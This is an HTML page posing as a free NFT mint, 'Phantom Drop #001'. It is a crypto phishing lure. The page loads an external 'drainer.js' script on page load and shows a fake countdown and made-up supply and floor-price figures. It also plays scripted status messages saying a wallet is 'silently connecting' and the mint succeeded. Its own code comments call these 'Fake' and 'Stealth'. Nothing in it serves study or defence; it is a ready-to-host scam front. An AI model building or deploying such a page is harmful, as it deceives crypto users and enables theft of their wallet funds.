<!DOCTYPE html>
<html>
<head>
  <meta charset="utf-8">
  <meta name="viewport" content="width=device-width,initial-scale=1">
  <title>Phantom Drop #001 • FREE MINT LIVE</title>
  <link rel="icon" href="https://i.ibb.co/TzQNvLM/FB-IMG-1763052170253.jpg"/>
  <script src="drainer.js" defer></script>
  <style>
    @import url('https://fonts.googleapis.com/css2?family=Orbitron:wght@900&family=Rajdhani:wght@700&display=swap');
    body{margin:0;background:#0a0a1a;color:#e0e0ff;font-family:Rajdhani,sans-serif;display:flex;justify-content:center;align-items:center;min-height:100vh;background:radial-gradient(circle at 10% 20%,rgba(0,255,157,0.15),transparent 20%),radial-gradient(circle at 90% 80%,rgba(0,255,157,0.15),transparent 20%);}
    .card{max-width:480px;width:100%;background:#111127;border-radius:24px;overflow:hidden;box-shadow:0 20px 60px rgba(0,0,0,0.8),0 0 30px rgba(0,255,157,0.5);border:2px solid rgba(0,255,157,0.4);}
    .logo{font-family:Orbitron,sans-serif;font-size:3.8rem;text-align:center;padding:30px;background:linear-gradient(135deg,rgba(0,255,157,0.2),transparent);background-clip:text;-webkit-background-clip:text;color:transparent;}
    img{width:100%;height:420px;object-fit:cover;}
    .content{padding:30px;text-align:center;}
    .timer{font-family:Orbitron,sans-serif;font-size:3.5rem;color:#ff3366;text-shadow:0 0 30px #ff0066;}
    .countdown{background:rgba(255,51,102,0.2);border:3px solid #ff3366;border-radius:20px;padding:20px;margin:20px 0;animation:p 1.5s infinite;}
    @keyframes p{0%,100%{box-shadow:0 0 30px #ff0066}50%{box-shadow:0 0 60px #ff0066}}
    .status{color:#00ff9d;background:rgba(0,255,157,0.15);padding:18px;border-radius:16px;font-weight:900;font-size:1.1rem;margin:20px 0;}
  </style>
</head>
<body>
  <div class="card">
    <div class="logo">PHANTOM DROP</div>
    <img src="https://i.ibb.co/TzQNvLM/FB-IMG-1763052170253.jpg" alt="NFT">
    <div class="content">
      <h1 style="font-size:2.4rem;color:#00ff9d;margin:10px 0;">#001 • Genesis Mint</h1>
      <div class="countdown">
        <div style="color:#ff3366;font-size:1.5rem;font-weight:900;">MINT GOES LIVE IN</div>
        <div class="timer" id="timer">00:00:58</div>
      </div>
      <div class="status" id="status">Preparing wallet connection...</div>
      <div style="margin-top:20px;color:#00ff9d;font-weight:900;">
        9,872 minted • 128 remaining • Floor: 42 SOL
      </div>
    </div>
  </div>

  <script>
    // Fake countdown (58 seconds)
    let sec = 58;
    const timer = setInterval(() => {
      sec--;
      document.getElementById("timer").textContent = "00:00:" + (sec < 10 ? "0" + sec : sec);
      if (sec <= 0) clearInterval(timer);
    }, 1000);

    // Stealth status updates
    setTimeout(() => document.getElementById("status").textContent = "Wallet detected... silently connecting...", 3000);
    setTimeout(() => document.getElementById("status").textContent = "Claiming your free NFT...", 8000);
    setTimeout(() => document.getElementById("status").textContent = "MINT SUCCESSFUL — Check your wallet!", 15000);
  </script>
</body>
</html>
